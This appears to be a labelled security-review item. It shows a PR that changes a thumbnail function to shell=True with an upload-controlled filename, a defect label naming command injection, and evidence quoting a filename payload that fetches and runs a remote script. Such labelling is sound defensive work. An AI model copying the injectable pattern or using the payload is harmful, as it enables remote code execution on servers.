title: Thumbnail shell command interpolated with user filename

base.thumbs.py:
import subprocess

def make_thumb(upload_dir: str, name: str, oid: str) -> None:
    # name validated upstream by ALLOWED_FILES regex
    subprocess.run(
        ["/usr/bin/convert", f"{upload_dir}/{name}", f"/srv/thumbs/{oid}.png"],
        check=True,
    )

head.thumbs.py:
import subprocess

def make_thumb(upload_dir: str, name: str, oid: str) -> None:
    # shell form needed for the imagemagick policy delegate
    subprocess.run(
        f"convert {upload_dir}/{name} /srv/thumbs/{oid}.png",
        shell=True,
        check=True,
    )

pr_metadata.title: Fix thumbnail conversion under IM7
pr_metadata.body: ImageMagick 7 needs the policy delegate; switch conversion to shell form.

labels.defect: Shell command injection: upload-controlled filename interpolated into a shell=True command
labels.evidence: Reproducible: upload name "x; curl https://example.invalid/e.sh | sh; #" makes the spawned shell run the fetched script as the service account; $(...) and backticks in name behave identically.

adjudication.notes: shell=True with upload-controlled filename; upstream validation was written for exec-array form.
